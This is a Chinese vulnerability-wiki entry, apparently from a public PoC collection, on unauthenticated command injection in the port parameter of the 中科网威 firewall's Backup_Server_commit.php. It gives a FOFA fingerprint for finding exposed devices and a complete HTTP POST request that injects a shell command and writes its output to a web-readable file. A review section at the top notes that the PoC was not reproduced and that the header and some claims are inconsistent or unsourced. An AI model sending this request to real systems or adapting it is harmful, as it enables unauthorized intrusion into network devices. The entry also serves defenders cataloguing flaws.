---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-6ee031428a81238e6e421930"
entity_id: "ve-6ee031428a81238e6e421930"
schema_version: "1"
fofa_unverified: "body="
title: "中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞"
product: "中科网威下一代防火墙"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "action=test，无Cookie，固定/tmp/www/reporter路径；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9FBackup_Server_commit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# 中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞 

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：中科网威下一代防火墙
- 本文讨论：Backup_Server_commit.php port参数命令注入
- 版本、权限与配置前提：action=test，无Cookie，固定/tmp/www/reporter路径；版本未知
- 资料类型：备份配置命令注入复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Length45与完整body显著不符
- 输出访问只称cs.txt没完整映射URL，结果图片未转录
- 在野已知/影响面广缺来源；FOFA元数据残缺
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 匿名性、系统权限及固件补丁待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

中科网威-防火墙控制系统是一款由中科网威有限公司开发的网络安全产品，它是基于软件的网络防火墙解决方案，为企业提供了完整的网络安全保障，中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞，未经授权的攻击者可通过该漏洞获取服务器权限。

# 影响版本

中科网威下一代防火墙控制系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="Get_Verify_Info(hex_md5(user_string)."

POC/EXP：

```http
POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

host=&mode=0&port=;echo%20%60pwd%60%20|tee%20/tmp/www/reporter/cs.txt|pwd&user=&password=&ftppath=
```

![image-20241015120750897](./.resource/中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞/media/image-20241015120750897.png)


访问cs.txt

![image-20241015120823688](./.resource/中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞/media/image-20241015120823688.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
